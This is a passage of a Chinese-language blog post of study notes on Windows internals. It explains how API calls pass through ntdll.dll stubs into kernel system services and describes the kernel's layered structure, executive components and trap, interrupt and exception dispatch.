<li>需要调用Windows内核一次或多次。 在这种情形下，可能存在一次或多次模式切换，子系统DLL或者通过ndll.dll调用到Windows执行体，或者通过win32k.sys注册的系统服务表（<code>KeServiceDescriptorTableShadow</code>）调用到win32k.sys 中。这类API函数的例子有：<ul>
<li><code>ReadFile</code>和<code>WriteFile</code>函数，调用底层的<code>NtReadFile</code>或<code>NtWriteFile</code>系统服务；</li>
<li><code>PostMessage</code>和<code>BitBIt</code>这样的窗口管理和GDI函数，调用win32k.sys 中的<code>NtUserPostMessage</code>或<code>NtGdiBitBIt</code>来完成其功能（它们也可能会调用Windows执行体函数，比如为了获取用以保护共享资源的锁）。</li>
</ul>
</li>
<li>需要Windows子系统进程（ Csrss.cxe）的协助来完成其功能。在这种情况下，子系统DLL向csrss.exe进程发送一个请求（以LPC消息的形式)，然后等待应答消息，直至收到应答并完成所有功能之后再返回调用者。这类API函数最典型的例子是<code>CreateProccess</code>和<code>CreateThread</code>，它们需要通知子系统进程，以维护子系统环境中进程和线程的状态。</li>
</ol>
<p>以上三种可能的执行方式仅仅代表了子系统DLL在执行一个服务请求时可能的执行路径，并非简单地将API函数分成三类。</p>
</div>

<p>其他有关Windows子系统的窗口管理器和GDI详细细节，可参考《Windows内核原理与实现》9.2章节。</p>
<h4 id="2-2-3-Ntdll-dll"><a href="#2-2-3-Ntdll-dll" class="headerlink" title="2.2.3 Ntdll.dll"></a>2.2.3 Ntdll.dll</h4><p>2.2.2中所提到的应用程序调用子系统DLL时的第2种情况，即应用程序会调用到内核一次或多次，因为Windows API无法直接调用到内核服务，这个时候就会使用到ntdll.dll，ntdll.dll充当应用程序和内核服务的桥梁，即从R3到R0的桥梁。</p>
<div class="note success"><p>Windows内核为用户模式代码提供了一组系统服务，供应用程序使用内核中的功能。 应用程序通常并不直接调用这些系统服务，而是通过一组系统DLL，最终通过ntdll.dll切换到内核模式下的执行体API函数中，以调用内核中的系统服务。Ntdll.dlI是连接用户模式代码和内核模式系统服务的桥梁。<strong>对于内核提供的每一个系统服务， 该DLL都提供个相应的存根函数，这些存根函数的名称以“Nt” 作为前缀</strong>。</p>
</div>

<div class="note danger"><p>Ntdll.dlI是一个特殊的系统支持库， 主要用于子系统DLL。它包含两种类型的函数：</p>
<ol>
<li>（执行体）系统服务分发<mark class="label danger">存根</mark>（stub），这些存根函数（例程）会调用Windows执行体的系统服务。（此部分函数供应用程序从R3转入R0使用，这部分函数以 <code>Nt</code>为前缀）。</li>
<li>系统内部支持函数， 供子系统、子系统DLL以及其他的原生映像文件使用。（此部分函数不支持模式R3到R0的切换）。</li>
</ol>
</div>

<ol>
<li><p>第一组函数为Windows执行体系统服务提供了接口，在用户模式下可以通过这些接口函数调用Windows执行体的系统服务。这样的函数超过了400个，比如<code>NtCreateFile</code>、<code>NtSetEvent</code>等。 如前所述，这些函数的大多数功能可以通过Windows API来访问得到(然而，有些函数则不然，它们仅被用于操作系统内部)。对于每一个这样的函数，Ntdll包含 了一个同名的入口点。函数内部的代码包含了与处理器体系架构相关的模式切换指令，通过该指令可转换到内核模式下，从而调用系统服务分发 器（system service dispatcher）。系统服务分发器在检验某些参数以后，再调用真正的内核模式系统服务，其中包括Ntoskrml.exe内部的实际代码。</p>
</li>
<li><p>对于NtdlI中的内部（系统）支持函数，比如：</p>
<ul>
<li>映像加载（以<code>Ldr</code>开头的函数）；</li>
<li>堆管理器；</li>
<li>Windows子系统进程通信函数（以<code>Csr</code>开头的函数）；</li>
<li>一般性的运行库例程（以<code>Rtl</code>开头的函数）；</li>
<li>对用户模式调试调试函数（以<code>DbgUi</code>开头的函数）；</li>
<li>Windows事件跟踪的支持函数（以<code>Erw</code>开头的函数）；</li>
<li>用户模式异步过程调用（APC，Asynchronous Procedure Call）分发器和异常分发器；</li>
<li>C运行库（CRT）例程的子集，仅限于字符串和标准库中的一些例程，比如memcpy、 strepy，ioa，等等。</li>
</ul>
</li>
</ol>
<p><strong>本文主要讲第一种</strong>（具体参考《Windows内核原理与实现》8.1.2）</p>
<div class="note primary"><p>在Windows的系统结构中，内核提供的服务都通过ntdll.dll模块被应用程序使用。 Windows应用程序调用一组系统 DLL中的API函数，间接地通过ntdll.dll中的存根函数来调用内核提供的系统服务。</p>
<p>Windows内核中的执行体层暴露了大量的功能供应用程序使用，那么，应用程序如何调用这些功能呢？譬如，<code>NtCreateFile</code>是Windows内核中的“创建文件”服务例程（函数），它运行在处理器的内核模式下，而应用程序的代码运行在用户模式下，所以，应用程序为了调用此“创建文件”服务，必须将处理器从用户模式切换到内核模式下。当然，模式切换工作并不需要由应用程序自已来完成，Windows 提供了一个系统模块ntdll.dll，<strong>已经实现了所有系统服务的模式切换工作</strong>。这一模式切换依赖于硬件体系结构。</p>
</div>

<p>ntdll.dll是Windows系统从ring3到ring0的入口。位于<code>Kernel32.dll</code>和<code>user32.dll</code>中的所有win32 API 最终都是调用ntdll.dll中的函数实现的。ntdll.dll中的函数使用<code>SYSENTRY</code>进入ring0，函数的实现实体在ring0中。</p>
<p>ntdll.dll中的大部分函数都是在MSDN中找不到描述的，因为这些函数介于Windows API与内核API之间，微软并<br>未公开全部的内核函数。</p>
<p>Windows中应用程序与与Windows内核打交道的过程如下图：</p>
<p><img data-src="https://i.loli.net/2021/05/23/BwbCPfAle1T4IVM.png" alt="9.png"></p>
<p>Windows应用程序调用系统DLL中的函数，这是大量已经文档化的API函数；这些系统DLL函数可能又进一步调用ntdll.dll中的系统函数，这些系统函数要么是操作系统提供的支持函数，要么是一些系统服务存根( stub)。系统服务存根函数利用模式切换指令进入到内核模式，调用内核提供的系统服务来完成应用程序的请求。举例：</p>
<div class="note success"><ol>
<li>Windows应用程序调用Windows API函数<code>CreateFile</code>来创建文件，此API函数实际上是<code>CreateFileW</code>，位于kernel32.dll模块中。</li>
<li><code>CreateFileW</code>函数又进步调用ntdll.dll中的 <code>NtCreateFile</code>函数。Ntdll.dll中的<code>NtCreateFile</code>函数是一个存根函数，它只是简单地将创建文件的请求转<mark class="label default">交给内核</mark>中的<code>NtCreateFile</code>函数。为了做到这一点，它通过ntdll.dll中的 <code>KiIntSystemCall</code>或<code>KiFastSystemCall</code>函数执行<mark class="label warning">int 2e</mark>或<mark class="label warning">sysenter</mark>指令，以便切换到内核模式下，然后由内核模式的系统服务分发函数<code>KiSystemService</code>来调用<code>NtCreateFile</code>系统服务。</li>
<li>待<code>NtCreateFile</code>系统服务执行完成以后，<code>KiSystemService</code>调用<code>KiServiceExit</code>函数，最终通过<mark class="label warning">iretd</mark>或<mark class="label warning">sysexit</mark>指令返回到用户模式ntdll.dl模块中。</li>
</ol>
</div>

<p><img data-src="https://i.loli.net/2021/05/25/j3uBplzOT5sbxR9.png" alt="10.png"></p>
<h3 id="2-3-内核模式"><a href="#2-3-内核模式" class="headerlink" title="2.3 内核模式"></a>2.3 内核模式</h3><p><strong>（Kernel mode）</strong></p>
<h4 id="2-3-1-内核结构"><a href="#2-3-1-内核结构" class="headerlink" title="2.3.1 内核结构"></a>2.3.1 内核结构</h4><div class="note default"><p>Windows内核分为三层：</p>
<ul>
<li><mark class="label primary">执行体层</mark></li>
<li><mark class="label warning">内核层</mark></li>
<li><mark class="label success">硬件抽象层</mark></li>
</ul>
<p><mark class="label danger">执行体层和内核层位于同一个二进制模块中，即内核基本模块，其名称为ntoskrnl.exe</mark></p>
</div>



<ol>
<li><mark class="label success">硬件抽象层</mark>（Hardware Abstraction Layer，简称HAL）：与硬件直接打交道的这一层称为，这一层的用意是把所有与硬件相关联的代码逻辑隔离到一个专门的模块中，从而使上面的层次尽可能做到独立于硬件平台。</li>
<li><mark class="label warning">内核层</mark>：HAL之上是内核层，有时候也称为微内核（micro-kernel），这层包含了基本的操作系统原语和功能，如线程和进程、线程调度、中断和异常的处理、同步对象和各种同步机制。</li>
<li><mark class="label primary">执行体层</mark>：在内核层之上则是执行体（executive）层，这一层的目的是提供些可供上层应用程序或内核驱动程序直接调用的功能和语义。Windows内核的执行体包含一个对象管理器，用于一致地管理执行体中的对象。</li>
</ol>
<p>执行体层和内核层位于同一个二进制模块中，即内核基本模块，其名称为ntoskrnl.exe。内核层和执行体层的分工是：</p>
<ul>
<li>内核层实现操作系统的基本机制，而所有的策略决定则留给执行体。</li>
<li>执行体中的对象绝大多数封装了一个或者多个内核对象，并且通过某种方式（比如对象句柄）暴露给应用程序。</li>
</ul>
<p>Windows内核的详细组成结构如下图：</p>
<p><img data-src="https://i.loli.net/2021/05/18/nNp3YAsozRtj8dV.png" alt="6.png"></p>
<div class="note danger"><p><mark class="label default">Ntdll.dll</mark></p>
<p>Windows内核为用户模式代码提供了一组系统服务，供应用程序使用内核中的功能。应用程序通常并不直接调用这些系统服务，而是通过一组系统DLL，最终通过<mark class="label default">ntdll.dll</mark>切换到内核模式下的执行体API函数中，以调用内核中的系统服务。<mark class="label primary">Ntdll.dlI是连接用户模式代码和内核模式系统服务的桥梁。</mark><mark class="label warning">对于内核提供的每一个系统服务， 该DLL都提供个相应的存根函数</mark>，这些存根函数的名称以“Nt” 作为前缀，例如NCreateProcess NtOpenFile 和NtSetTimer。</p>
<p>另外，ntdll. dll还提供了许多系统级的支持函数：</p>
<ul>
<li>以 <code>Nt</code>为前缀：ntdll. dll存根函数的名称</li>
<li>以 <code>Ldr</code>为前缀：映像加载器函数</li>
<li>以 <code>Csr</code>为前缀：Windows子系统进程通信函数</li>
<li>以 <code>Dbg</code>为前缀：调试函数</li>
<li>以 <code>Etw</code>为前缀：系统事件函数</li>
<li>以 <code>Rt</code>为前缀：一般的运行支持函数</li>
<li>字符串支持函数等。</li>
</ul>
</div>

<div class="note success"><p><mark class="label info">执行体API函数</mark></p>
<p>执行体API函数接收的参数来自于各种应用程序，因此，为了确保系统的健壮性， 以及抵抗来自用户模式的恶意攻击，<mark class="label info">所有的执行体API函数必须保证参数的有效性</mark>。这意味着它们必须在恰当的时刻检查参数的值，若是指针的话，还必须保证调用者可以访问指针所指的内存。通常，执行体系统服务函数会在其开始处，对所接收的参数逐一探查它们的可访问性。</p>
</div>

<h4 id="2-3-2-内核及Ntoskrnl-exe"><a href="#2-3-2-内核及Ntoskrnl-exe" class="headerlink" title="2.3.2 内核及Ntoskrnl.exe"></a>2.3.2 内核及Ntoskrnl.exe</h4><p>Windows内核的执行体包含一个对象管理器，用于一致地管理执行体中的对象。执行体层和内核层位于同一个二进制模块中，即内核基本模块，其名称为<mark class="label primary">ntoskrnl.exe</mark>。执行体层是ntoskrnl.exe的上层部分，内核层是ntoskrnl.exe的下层部分。</p>
<div class="note danger"><p>内核层和执行体层的分工是：内核层实现操作系统的基本机制，而所有的策略决定则留给执行体。执行体中的对象绝大多数封装了一个或者多个内核对象，并且通过某种方式（比如对象句柄）暴露给应用程序。</p>
</div>



<p>Windows的内核（层）按照面向对象的思想来设计，它管理两种类型的对象：分发器对象（dispatcher object）和控制对象。</p>
<ul>
<li>分发器对象实现了各种同步功能，这些对象的状态会影响线程的调度。Windows内核实现的分发器对象包括：<ul>
<li>事件（event）</li>
<li>突变体（mutant）</li>
<li>信号量（semaphore）</li>
<li>进程（process）</li>
<li>线程（thread）</li>
<li>队列（queue</li>
<li>门（gate）</li>
<li>定时器（timer）</li>
</ul>
</li>
<li>控制对象被用于控制内核的操作，但是不影响线程的调度，它包括：<ul>
<li>异步过程调用（APC）</li>
<li>延迟过程调用（DPC）</li>
<li>中断对象等。</li>
</ul>
</li>
</ul>
<p><strong>关于Windows研究内核</strong></p>
<p>Windows并非一个开放源代码的操作系统，Micosoft 开放了一份以Windows XP x64和Windows Server 20003 SPI为基础的内核源代码，它可以编译和运行，作为教育科研机构的教学实践和研究的平台使用，称为<mark class="label default">WRK</mark>（Windows Research Kernel，Windows研究内核）。除了这份源代码本身，WRK还提供了其他一些材料。主要包含以下：</p>
<ul>
<li>WRK内核源代码，涉及进程、线程、内存管理、执行体、对象管理器、缓存管理器、本地过程调用（LPC）、注册表、I&#x2F;O管理器、安全引用监视器，以及线程调度、APC（异步过程调用）、DPC（延迟的过程调用）、中断以及异常处理等。随源代码起提供的还有相应的编译工具，因此，无须额外的编译器即可将WRK编译成Windows Server 2003 SP1的可执行内核。</li>
<li>NT设计文档。这是一组早期的文档，尽管其内容已不完全适用于现在的Windows操作系统以及WRK中的代码，但是，通过阅读这些文档一方面可以清楚地理解 Windows NT背后的原始设计思想，另一方面也可以看出Windows在这十多年中是如何发展和进化的。这些文档涵盖了Windows操作系统的方方面面，甚至包括文件系统设计大纲和内核的调试结构等。</li>
</ul>
<p>其他内容于《Windows内核原理与实现》2.3.1中。</p>
<p>Windows的内核模块文件是ntoskrnl.exe，位于Windws\Sytem32目录下，它包含了Windows体系结构中的执行体和内核（或微内核）部分。WRK提供的源代码可以编译得到这一内核模块文件。</p>
<p>WRK包含了编译ntoskrnl.exe内核模块所需要的绝大部分代码，<strong>未公开部分的代码主要包括即插即用设备管理、电源管理、设备驱动程序检验器和虚拟DOS机的实现</strong>。为了编译WRK源代码以得到实际可运行的内核模块，缺失的这部分被以二进制目标代码的形式包含在了WRK中，该目录还包含了其他些需要静态链接的目标文件。</p>
<div class="note warning"><p>内核模块内部的每个组件都提供了一些接口函数供其他组件调用，也有一些函数供该组件内部使用。有一些组件内部函数也有规律可循：前缀第一个字母后面跟一个<code>i</code>，或者在前缀后面跟一个<code>p</code>。</p>
<ul>
<li><code>i</code>：<code>internal</code>，即内部的；</li>
<li><code> p</code>：<code>private</code>，即私有的；</li>
<li><code>Ki</code>：微内核；</li>
<li><code>Mi</code>：内存管理器的内部函数；</li>
<li><code>Halp</code>：HAL的内部函数；</li>
<li><code>Psp</code>：进程和线程管理组件的内部函数；</li>
<li><code>Iop</code>：I&#x2F;O管理器的内部函数。</li>
</ul>
</div>

<p>表2.3列出了一些常用的标识性前缀。</p>
<p><img data-src="https://i.loli.net/2021/05/26/f6z1tYC8iWxBM4v.png" alt="12.png"></p>
<h4 id="2-3-3-执行体"><a href="#2-3-3-执行体" class="headerlink" title="2.3.3 执行体"></a>2.3.3 执行体</h4><p>Windows执行体是Windows内核体的上层接口，包含了基本的<mark class="label warning">操作系统服务</mark>。这些系统服务由不同的组件组成，执行体包含以下组件：</p>
<ol>
<li><strong>进程和线程管理器</strong>。负贵创建进程和线程，以及终止进程和线程。在Windows中，对于进程和线程的底层支持是在内核层提供的，执行体在内核层的进程和线程对象的基础上，又提供了一些语义和功能。</li>
<li><strong>内存管理器</strong>。此组件实现了虚报内存管理，既负责系统地址空间的内存管理，又为每个进程提供了一个私有的地址空间，并且也支持进程之间内存共享。内存管理器也为缓存管理器提供了底层支持。</li>
<li><strong>安全引用监视器</strong>（SRM，Security Reference Monitor）。该组件强制在本地计算机上实施安全策略，它守护着操作系统的资源，执行对象的保护和审计。</li>
<li><strong>I&#x2F;O管理器</strong>。它实现了与设备无关的输入和输出功能，负责将IO请求分发给正确的设备驱动程序以便进步处理。</li>
<li><strong>缓存管理器</strong>。它为文件系统提供了统一的数据缓存支持， 允许文件系统驱动程序将磁盘上的数据映射到内存中，并通过内存管理器来协调物理内存的分配。</li>
<li><strong>配置管理器</strong>。它负责系统注册表的实现和管理。</li>
<li><strong>即插即用管理器</strong>。它负责列举设备，并为每个列举到的设备确定哪些驱动程序是必需的，然后加载并初始化这些驱动程序。当它检测到系统中的设备变化（增加或移除设备）时，负责发送恰当的事件通知。</li>
<li><strong>电源管理器</strong>。它负责协调电源事件，向设备驱动程序发送电源I&#x2F;O通知。当系统电源状态变化时，通知设备驱动程序处理设备的电源状态。即插即用设备的管理和电源的管理也可以看做是IO管理器的扩展功能。</li>
<li>……</li>
</ol>
<div class="note primary"><p>执行体包含以下5种类型的函数：</p>
<ol>
<li><p>可在用户模式下调用的<mark class="label warning">导出函数</mark>。这些函数称为<mark class="label default">系统服务</mark>，对这些函数的调用接口位于Ntdll模块中，即通过Ntdll导出。可分为：</p>
<ul>
<li>应用程序可通过Windows API来间接地调用这些函数；</li>
<li>应用程序无法通过Windows API来调用的函数，直接链接ntdll.dll来完成。如LPC（Local Procedure Call，本地过程调用）函数、各种查询函数（如<code>NtQueryInformation&lt;Xxx&gt;</code>），以及一些专用的函数，比如<code>NtCreatePagingFile</code>等。</li>
</ul>
</li>
<li><p>可通过<code>DeviceIoControl</code>函数来调用的<mark class="label warning">设备驱动程序函数</mark>。这为从用户模式到内核模式提供了一个通用的接口，因而在用户模式下可以调用设备驱动程序中并不与读或者写操作关联的函数。并且在Windows DDK中有关于这些函数的文档。</p>
</li>
<li><p>只能在<mark class="label warning">内核模式下调用</mark>的<strong>导出函数</strong>。已经<strong>被文档化</strong>的，这些函数可以被设备驱动程序调用。</p>
</li>
<li><p>在内核模式下调用，未被导出的函数，供执行体组件之间相互调用，但<strong>未被文档化</strong>的函数。这包括执行体内部使用的一组支持函数。</p>
</li>
<li><p>属于一个组件的内部（模块）函数。</p>
</li>
</ol>
</div>

<div class="note info"><p>此外，执行体还包含4组主要的支持函数，供以上这些<mark class="label success">执行体组件调用</mark>。差不多有1&#x2F;3的支持函数可以在Windows DDK中找到相应的文档，因为设备驱动程序也要调用它们。这4类支持函数如下所列：</p>
<ol>
<li>对象管理器。它负责创建、管理和删除Windows执行体对象，以及用于表达操作系统资源的抽象数据类型，比如进程、线程和各种同步对象。</li>
<li>LPC设施。LPC设施负责在同一台机器上的客户进程和服务器进程之间传递消息。 LPC是RPC（Remote Procedure Call，远程过程调用，关于网络上客户进程和服务器进程之间通信的工业标准）的一个优化版本。</li>
<li>一组运行时库函数。其功能广泛，涵盖字符串处理、算术运算、数据类型转换以及安全结构处理等。</li>
<li>执行体支持例程。例如系统内存分配（换页内存池和非换页内存池）、互锁的内存访问，以及对两种特殊类型同步对象（资源和互斥体）的支持。</li>
</ol>
</div>





<h4 id="2-3-4-系统机制"><a href="#2-3-4-系统机制" class="headerlink" title="2.3.4 系统机制"></a>2.3.4 系统机制</h4><ul>
<li>系统机制<ul>
<li>陷阱分发<ul>
<li>系统服务分发</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Windows操作系统提供了一些基本的<mark class="label success">机制</mark><mark class="label danger">供内核模式的组件</mark>（比如执行体、内核和设备驱动程序）使用。本节将介绍下面的系统机制中的陷阱（其他机制可查看《深入解析Windows操作系统第6版》第3章）：</p>
<ol>
<li><mark class="label default">陷阱分发</mark>， 包括
<ul>
<li>中断；</li>
<li>延迟的过程调用（DPC）；</li>
<li>异步过程调用（APC）；</li>
<li>异常分发；</li>
<li><mark class="label default">系统服务分发</mark>。</li>
</ul>
</li>
<li>执行体对象管理器。</li>
<li>同步，包括自旋锁、内核分发器对象、等待是如何实现的，以及一些专门针对用户模式的同步原语（它们不同于传统的同步对象，可避免切换至内核模式）。</li>
<li>系统辅助线程</li>
<li>其他的机制，比如Windows全局标志。</li>
<li>高级的本地过程调用（ALPC）。</li>
<li>内核事件跟踪。</li>
<li>Wow64。</li>
<li>用户模式调试。</li>
<li>映像加载器。</li>
<li>超级管理器（Hyper-V）。</li>
<li>内核事务管理器（KTM）。</li>
<li>内核补丁保护（KPP）。</li>
<li>代码完整性。</li>
</ol>
<h4 id="2-3-5-陷阱分发"><a href="#2-3-5-陷阱分发" class="headerlink" title="2.3.5 陷阱分发"></a>2.3.5 陷阱分发</h4><div class="note danger"><p><mark class="label info">中断</mark>和<mark class="label warning">异常</mark>是导致处理器转向正常控制流<strong>之外</strong>代码的两种操作系统条件。硬件或者软件都可以检测到这两种条件。</p>
</div>

<p>术语<strong>陷阱</strong>（trap）指的是这样种机制：当异常或者中断发生时，处理器捕捉到一个执行线程，并且将控制权转移到操作系统中某一固定地址处。在Windows中， 处理器会将控制权转给<strong>陷阱处理器</strong>（trap handler）。所谓陷阱处理器，是指与某个特定的中断或异常相关联的<strong>函数</strong>。</p>
<div class="note danger"><p><strong>陷阱分发</strong>：陷阱处理器用以区分和确认硬件或者软件产生的陷阱属于中断还是异常或是系统服务。然后转由相应的中断分发、异常分发或系统服务分发去处理后续事项。同时分发任务由相应的处理器去完成，处理器实际上就是一些函数（例程）。</p>
</div>

<p>图3.1显示了一些能激活陷阱处理器的条件：</p>
<p><img data-src="https://i.loli.net/2021/05/29/atLHVbdXJPMIfwi.png" alt="13.png"></p>
<p>导致陷阱的条件有如：中断、异常、系统服务调用（分发）、DPC及APC等。</p>
<div class="note default"><p>关于中断和异常：</p>
<p><mark class="label warning">中断</mark>：中断分为异步中断和同步中断。</p>
<ul>
<li><mark class="label info">异步中断</mark>，也叫硬中断、外部中断、中断。是指由于外部设备事件所引起的中断。中断由外因引起。</li>
<li><mark class="label info">同步中断</mark>，也叫内中断、<strong>异常</strong>。是指由于 CPU 内部事件所引起的中断。异常由CPU本身原因引起。同时，<strong>软中断属于异常中的一种</strong>。同步中断就属于异常。</li>
</ul>
<p><strong>硬中断就是外部设备（比如IO，时钟设备）的中断，<mark class="label warning">软中断就是INT指令</mark>，异常就是CPU内部的中断</strong>，比如除零异常。</p>
<p>硬件的中断可分为<strong>上半部分</strong>和<strong>下半部分</strong>，下半部分也叫做软中断。上半部在屏蔽中断的上下文中运行，用于完成关键性的处理动作，然后产生软中断。下半部就是软中断处理程序，对时间要求不是非常紧急，通常比较耗时的，因此不在硬中断服务程序中执行。</p>
<p><strong>异常的分类： 处理器探测到的异常、编程异常（也称<mark class="label warning">软中断</mark>）。</strong></p>
<ul>
<li>处理器探测到的异常：<ul>
<li>故障（Fault）</li>
<li>陷阱（Trap）</li>
<li>异常终止（Abort）</li>
</ul>
</li>
<li>编程异常（也称软中断）：<ul>
<li>int指令</li>
</ul>
</li>
</ul>
<p>对于中断和异常的处理，主要是利用<strong>中断描述符表IDT</strong>中的中断描述符。</p>
<p>陷入中断(trap interrupt)， 也称软中断(soft interrupt)，系统调用(system call)简称trap：在程序中使用请求系统服务的系统调用而引发的事件。陷入是由在 cpu 上运行的当前进程导致的。如：</p>
<ul>
<li>除零错；</li>
<li>地址访问越界等。</li>
</ul>
</div>

<p>参考：</p>
<ul>
<li>《<a href="https://www.zhihu.com/question/30432536#:~:text=%E8%BD%AF%E4%B8%AD%E6%96%AD%E5%8F%88%E5%8F%AB%E5%81%9A%E7%BC%96%E7%A8%8B%E5%BC%82%E5%B8%B8%EF%BC%8C%E4%B8%BB%E8%A6%81%E7%94%A8%E4%BA%8E%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8D%B3int%200x80%E4%BB%A5%E5%8F%8A%E7%BB%99%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F%E9%80%9A%E6%8A%A5%E4%B8%80%E4%B8%AA%E7%89%B9%E5%AE%9A%E7%9A%84%E4%BA%8B%E4%BB%B6%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BD%AF%E4%B8%AD%E6%96%AD%E6%98%AF%E5%BC%82%E5%B8%B8%E7%9A%84%E4%B8%80%E7%A7%8D%EF%BC%8C%E5%B1%9E%E4%BA%8E%E5%90%8C%E6%AD%A5%E4%B8%AD%E6%96%AD%E3%80%82%20%E6%89%80%E4%BB%A5%E4%B8%8D%E8%83%BD%E8%AF%B4%E5%BC%82%E6%AD%A5%E4%B8%AD%E6%96%AD%E5%88%86%E4%B8%BA%E8%BD%AF%E4%B8%AD%E6%96%AD%E5%92%8C%E7%A1%AC%E4%B8%AD%E6%96%AD%E3%80%82%20%E6%AD%A3%E5%A6%82%E6%A5%BC%E4%B8%BB%E6%89%80%E8%AF%B4%EF%BC%8C%E4%B8%AD%E6%96%AD%E5%88%86%E4%B8%BA%E5%90%8C%E6%AD%A5%E4%B8%AD%E6%96%AD%EF%BC%8C%E4%B9%9F%E7%A7%B0%E5%BC%82%E5%B8%B8%EF%BC%8C%E5%92%8C%E5%BC%82%E6%AD%A5%E4%B8%AD%E6%96%AD%EF%BC%8C%E4%B9%9F%E7%A7%B0%E4%B8%AD%E6%96%AD%E3%80%82%20%E5%BD%93%E6%8C%87%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%B6%E7%94%B1CPU%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E4%BA%A7%E7%94%9F%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%8F%AA%E6%9C%89%E5%9C%A8%E8%AF%A5%E6%8C%87%E4%BB%A4%E7%BB%88%E6%AD%A2%E6%89%A7%E8%A1%8C%E5%90%8ECPU%E6%89%8D%E4%BC%9A%E5%8F%91%E5%87%BA%E4%B8%AD%E6%96%AD%E3%80%82%20%E5%BC%82%E5%B8%B8%E5%8F%AF%E4%BB%A5%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%BB%86%E5%88%86%E4%B8%BA%E5%A4%84%E7%90%86%E5%99%A8%E6%8E%A2%E6%B5%8B%E5%BC%82%E5%B8%B8%E5%92%8C%E5%89%8D%E9%9D%A2%E6%8F%90%E5%88%B0%E7%9A%84%E7%BC%96%E7%A8%8B%E5%BC%82%E5%B8%B8%E3%80%82%20%E6%95%85%E9%9A%9C,%E6%95%85%E9%9A%9C%E5%BE%88%E6%9C%89%E7%89%B9%E7%82%B9%EF%BC%8C%E6%95%85%E9%9A%9C%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%BA%A0%E6%AD%A3%E7%9A%84%EF%BC%8C%E4%B8%80%E6%97%A6%E7%BA%A0%E6%AD%A3%EF%BC%8C%E4%BC%9A%E9%87%8D%E6%96%B0%E6%89%A7%E8%A1%8C%E5%BC%95%E8%B5%B7%E6%95%85%E9%9A%9C%E7%9A%84%E6%8C%87%E4%BB%A4%E3%80%82%20%E8%BF%99%E5%B0%B1%E6%98%AF%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8%E7%9A%84%E6%9C%BA%E5%88%B6%E3%80%82%20%E7%94%B1%E5%85%B6%E4%BB%96%E7%A1%AC%E4%BB%B6%E9%9A%8F%E6%9C%BA%E4%BA%A7%E7%94%9F%E3%80%82%20%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E5%8F%AF%E5%B1%8F%E8%94%BD%E4%B8%AD%E6%96%AD%E5%92%8C%E9%9D%9E%E5%B1%8F%E8%94%BD%E4%B8%AD%E6%96%AD%E3%80%82%20%E5%AF%B9%E4%BA%8E%E4%B8%AD%E6%96%AD%E5%92%8C%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86%EF%BC%8C%E4%B8%BB%E8%A6%81%E6%98%AF%E5%88%A9%E7%94%A8%20%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8IDT%20%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%82%20%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%B1%9E%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%8F%8F%E8%BF%B0%E7%AC%A6%EF%BC%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E6%95%B0%E6%8D%AE%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8D%E5%90%8C%E3%80%82">中断，异常，陷阱，软硬中断，同异步中断？？</a>》</li>
<li>《<a href="https://blog.csdn.net/zhangxinrun/article/details/5967233">同步中断（异常）和 软中断</a>》</li>
<li>《<a href="https://blog.csdn.net/weixin_45783996/article/details/109134900">硬中断，软中断，信号，异常</a>》</li>
<li>《<a href="https://blog.csdn.net/qq_29996285/article/details/88078939">面试考点——中断和异常的区别</a>》</li>
<li>《<a href="https://www.cnblogs.com/charlesblc/p/6277810.html">信号和中断的比较 + 中断和异常的比较</a>》</li>
<li>《<a href="https://www.cnblogs.com/HsinTsao/p/6395570.html">异常、中断、陷阱</a>》</li>
</ul>
<div class="note success"><p>中断和异常的区分（内核按照下面的方法来区分中断和异常。）：</p>
<ul>
<li><strong>中断</strong>是一个<mark class="label primary">异步</mark>事件（可以在任何时候发生），并且与处理器当前正在执行的任务毫无关系。中断主要是由I&#x2F;O设备、处理器时钟或者定时器产生的，并且可以被启用（打开）或者禁用（关闭）。<ul>
<li>I&#x2F;O设备；</li>
<li>处理器时钟；</li>
<li>定时器。</li>
</ul>
</li>
<li><strong>异常</strong>是一个<mark class="label primary">同步</mark>条件，它往往是一个特殊指令执行的结果。（中止（abort）-- 比如机器检查，是一种典型的不与指令执行有关联的处理器异常。）在同样的条件下用同样的数据第二次运行程序可以重现原来的异常。异常的例子有（内核把系统服务调用看作是异常，不过，从技术上讲，它们是系统陷阱。）：<ul>
<li>内存访问违例；</li>
<li>特定的调试器指令；</li>
<li>除零错误；</li>
<li><mark class="label warning">系统服务调用</mark>。</li>
</ul>
</li>
</ul>
</div>

<div class="note danger"><p><mark class="label info">无论是硬件还是软件都能够产生异常和中断</mark>。例如，总线错误异常是由于硬件问题引起的，而除零异常则是软件错误的结果。同样，I&#x2F;O设备可以产生中断，内核本身也可以发出软中断（比如 APC 或者 DPC）。</p>
<ol>
<li><p>（硬中断）当硬件异常或者中断产生时：</p>
<ul>
<li><strong>内核模式下</strong>：处理器将在被中断的线程的内核栈中记录下足够多的机器状态信息，因而可以回到控制流中的该点处继续执行，就好像什么也没有发生过一样。</li>
